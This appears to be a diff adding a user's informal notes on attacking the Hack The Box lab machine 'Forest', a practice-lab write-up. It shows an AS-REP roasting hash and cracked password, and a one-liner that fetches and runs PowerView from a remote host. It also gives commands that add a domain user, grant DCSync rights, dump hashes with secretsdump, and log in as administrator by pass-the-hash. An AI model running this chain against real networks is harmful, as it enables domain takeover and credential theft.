@@ -1,0 +1,86 @@
+$krb5asrep$23$svc-alfresco@HTB:7b6359bd0e9fa9d37375fbb9753bc77e$f132fe15b1eea898954cc56d17a4803f271ac1d193dbf5b8775bd6ea4508232dd7e3fc3393f5f825d4266e1f16b1678671cc8ddce72fdc637e4ced87783b922e7d6a234d5a4fe7e74d5eb4e7f92b4316579fa42f4fe56eb6a70e661de8ba44d55097a5e1d56bb2c7bc70047e4b8fecbed3b296acf2140e3294b0e9ae87325640e20c71ab5b7ede859e9bdef65d6b347a3a84170c03a7faede0264ec63b1769a5081ce4bd65bceec81709dbda3e584e5c2b975142eaa453ca0e0036389c01251b72e9082a8b952ece78241005ee7c2bf7ca41dcf63cdaf63c75b7f1e1ba3373c5
+
+
+password cracked by John The Ripper : ?:s3rvice
+username : svc-alfresco
+password : ?:s3rvice
+
+
+rpcclient -U svc-alfresco 10.10.10.161
+username : svc-alfresco
+password : s3rvice
+
+
+domain nam : HTB (10.10.10.161)
+	   : htb.local
+
+user shell : evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
+
+
+upload tips: IEX(new-object net.webclient).downloadstring('http://ip/PowerView.ps1%27)
+
+
+================================================================================================================
+notes:
+
+first enum with e4l
+then, copy the username in step 1
+next , try using GetNPUsers.py and the username u got from el4
+after that, u got password hashes, cracked by John the Ripper and get password.
+then using veil-winrm to login and got user.txt
+
+
+
+ROOT:
+using BloodHound because it's a Domain Controller ( part of Actice Directory )
+first we upload SharpHound to FOREST via windows VM
+dunno why evil-winrm cant triggered SharpHound, so we use the IPPsec's method
+in Active Video.
+
+Got windows VM , did as IPPSEC did in active box(runas command)
+
+
+We got some data(.zip), puts in BloodHound to view to whole thing.
+Now we are try to ACL pwn's
+the article down here :
+https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/
+SHOULD READ !
+
+We follow the steps as bloodhound guide us.
+the GenericAll and WriteDacl:
+(all the commands below using PowerView.ps1)
+( here's the url: https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1#L9893 )
+
+And this is what the steps I do on the box:
+First, upload the PowerView.ps1
+> upload /root/Desktop/htb/ACL_PWN/PowerView.ps1 C:\Users\svc-alfresco\Documents
+
+Now, instead of doing priesc on svc account , I prefer creating a account for myself.
+
+> net user madnow mad123456 /add/ /domain
+> Import-Module .\PowerView.ps1
+> Add-ADGroupMember -Identity "EXCHANGE WINDOWS PERMISSIONS" -Members madnow
+> Add-DomainGroupMember -Identity 'EXCHANGE WINDOWS PERMISSIONS' -Members 'madnow'
+> Add-DomainObjectAcl -TargetIdentity "DC=HTB,DC=LOCAL" -Rights DCSync -PrincipalIdentity madnow
+
+
+Or, you can try the complicated one, commands with creds:
+> Import-Module .\PowerView.ps1
+> Add-ADGroupMember -Identity "EXCHANGE WINDOWS PERMISSIONS" -Members madnow
+> $SecPassword = ConvertTo-SecureString 'mad123456' -AsPlainText -Force
+> $Cred = New-Object System.Management.Automation.PSCredential('htb.local\madnow' ,$SecPassword)
+> Add-DomainGroupMember -Identity 'EXCHANGE WINDOWS PERMISSIONS' -Members 'madnow' -Credential $Cred
+> Add-DomainObjectAcl -TargetIdentity "DC=HTB,DC=LOCAL" -Rights DCSync -PrincipalIdentity madnow
+
+
+after these steps, you can now dump the admin hashes by running secretsdump.py
+> secretsdump.py htb/madnow:mad123456@10.10.10.161 -dc-ip 10.10.10.161
+
+getting the hashes
+
+now using 
+> wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6  administrator@10.10.10.161
+
+to login on the forest as root.
+
+=======================================================================================================================
